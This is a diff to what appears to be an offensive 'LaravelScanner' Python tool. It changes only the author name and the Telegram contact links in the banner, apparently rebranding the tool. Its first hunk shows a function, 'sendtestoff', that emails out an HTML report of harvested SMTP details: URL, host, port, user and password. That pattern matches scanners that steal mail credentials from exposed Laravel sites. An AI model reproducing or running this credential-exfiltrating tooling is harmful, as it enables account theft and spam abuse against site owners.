@@ -72,7 +72,7 @@ def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
     message['From'] = sender_email
     message['To'] = receiver_email
     text = '        '
-    html = f"        <html>\n          <body>\n            <p>Send,<br>\n              BY East Code</p>\n              <p>-------------------</p>\n              <p>URL    : {url}</p>\n              <p>HOST   : {mailhost}</p>\n              <p>PORT   : {mailport}</p>\n              <p>USER   : {mailuser}</p>\n              <p>PASSW  : {mailpass}</p>\n              <p>SENDER : {mailfrom}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
+    html = f"        <html>\n          <body>\n            <p>Send,<br>\n              BY itslucifero</p>\n              <p>-------------------</p>\n              <p>URL    : {url}</p>\n              <p>HOST   : {mailhost}</p>\n              <p>PORT   : {mailport}</p>\n              <p>USER   : {mailuser}</p>\n              <p>PASSW  : {mailpass}</p>\n              <p>SENDER : {mailfrom}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
     part1 = MIMEText(text, 'plain')
     part2 = MIMEText(html, 'html')
     message.attach(part1)
@@ -981,9 +981,9 @@ if __name__ == '__main__':
         
                              LaravelScanner v1.0         Coded By :                                                                
                        
-                         For tools contact me : https://t.me/mrhouse998
+                         For tools contact me : https://t.me/itslucifero
                          Date : 19 March 2022 10pm
-                         Group https://t.me/mrhouse998  """)
+                         Group https://t.me/itslucifero  """)
     try:
         readcfg = ConfigParser()
         readcfg.read(pid_restore)
